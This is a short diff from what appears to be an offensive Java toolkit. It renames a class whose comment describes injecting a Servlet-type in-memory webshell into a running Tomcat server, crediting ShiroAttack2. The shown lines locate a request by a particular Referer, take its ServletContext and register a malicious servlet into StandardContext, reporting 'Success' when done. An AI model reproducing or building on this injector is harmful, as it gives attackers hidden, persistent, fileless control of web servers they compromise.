@@ -21,7 +21,7 @@ import java.util.List;
  * 遍历线程组，在 request 中查找带有特定 Referer 的请求，并从 request 获取 ServletContext 添加 Servlet 型内存马
  * 添加成功后，会回显 Success 字样，参考 ShiroAttack2
  */
-public class TFMSFromRequestS implements Servlet {
+public class TSMSFromRequest implements Servlet {
     public static HttpServletRequest request = null;
 
     public static HttpServletResponse response = null;
@@ -124,7 +124,7 @@ public class TFMSFromRequestS implements Servlet {
             wrapper.setName(NAME);
             standardContext.addChild(wrapper);
 
-            Servlet servlet = new TFMSFromRequestS();
+            Servlet servlet = new TSMSFromRequest();
             wrapper.setServletClass(servlet.getClass().getName());
 
             wrapper.setServlet(servlet);
